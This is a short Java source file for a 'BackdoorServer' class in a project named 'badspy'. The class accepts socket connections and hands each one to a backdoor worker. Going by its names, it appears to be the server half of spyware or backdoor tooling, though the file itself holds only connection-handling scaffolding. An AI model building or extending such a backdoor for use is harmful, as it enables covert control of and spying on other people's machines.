package com.blogspot.sontx.badspy.badserver.bo;

import com.blogspot.sontx.badspy.badserver.Config;
import com.blogspot.sontx.badspy.badserver.bo.bdrworker.BdrPackManager;
import com.blogspot.sontx.badspy.badserver.bo.bdrworker.BdrWorker;
import com.blogspot.sontx.jlog.Log;

import java.io.IOException;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;

/**
 * Copyright 2016 by sontx
 * Created by sontx on 25/4/2016.
 */
public class BackdoorServer extends Server<BdrWorker> {

    public BackdoorServer(String addr, int port) throws IOException {
        super(addr, port);
        BdrPackManager.init(Config.PACKAGE_DIR);
    }

    @Override
    protected BdrWorker createWorker(Socket socket) throws IOException {
        BdrWorker worker = null;
        try {
            worker = new BdrWorker(socket);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return worker;
    }

}
